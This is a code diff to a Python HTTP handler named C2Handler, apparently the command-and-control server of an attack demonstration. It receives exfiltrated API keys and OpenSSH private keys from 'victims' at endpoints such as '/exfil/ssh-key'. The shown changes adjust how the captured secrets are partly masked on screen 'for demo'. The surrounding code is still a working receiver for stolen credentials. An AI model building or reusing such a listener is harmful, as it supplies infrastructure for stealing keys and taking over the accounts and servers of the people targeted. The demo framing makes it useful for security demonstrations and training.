@@ -64,7 +64,10 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
                 val = v[0] if v else ""
                 if not val:
                     continue
-                masked = val[:8] + "*" * 20 + val[-4:] if len(val) > 16 else val
+                if len(val) > 8:
+                    masked = val[:4] + "*" * 20 + val[-4:]
+                else:
+                    masked = val[:2] + "****"
                 print(f"{RED}{BOLD}  {k.upper():>12}: {masked}{RESET}")
             print(f"{DIM}  (real keys captured — masked for demo){RESET}")
 
@@ -88,16 +91,19 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
                 print(f"{YELLOW}  {k.upper():>12}: {val}{RESET}")
 
         elif self.path == "/exfil/ssh-key":
-            lines = body.strip().split("\n")
-            if lines and len(body) > 50:
-                print(f"{RED}{BOLD}  PRIVATE KEY RECEIVED ({len(body)} bytes):{RESET}")
-                if lines[0].startswith("-----"):
-                    print(f"{RED}  {lines[0]}{RESET}")
-                print(f"{RED}  {'*' * 60}{RESET}")
-                print(f"{RED}  {'*' * 60}{RESET}")
-                if lines[-1].startswith("-----"):
-                    print(f"{RED}  {lines[-1]}{RESET}")
-                print(f"{DIM}  (full private key captured — content masked for demo){RESET}")
+            raw = body.strip()
+            if len(raw) > 50:
+                clean = raw.replace("-----BEGIN OPENSSH PRIVATE KEY-----", "").replace("-----END OPENSSH PRIVATE KEY-----", "").replace(" ", "").replace("\n", "")
+                head = clean[:40]
+                tail = clean[-40:] if len(clean) > 80 else ""
+                print(f"{RED}{BOLD}  PRIVATE KEY RECEIVED ({len(raw)} bytes):{RESET}")
+                print(f"{RED}  -----BEGIN OPENSSH PRIVATE KEY-----{RESET}")
+                print(f"{RED}  {head}...{RESET}")
+                print(f"{RED}  {'*' * 52}{RESET}")
+                print(f"{RED}  {'*' * 52}{RESET}")
+                print(f"{RED}  ...{tail}{RESET}")
+                print(f"{RED}  -----END OPENSSH PRIVATE KEY-----{RESET}")
+                print(f"{DIM}  (full private key captured — middle masked for demo){RESET}")
             else:
                 print(f"{DIM}  (no SSH key found on victim){RESET}")
 
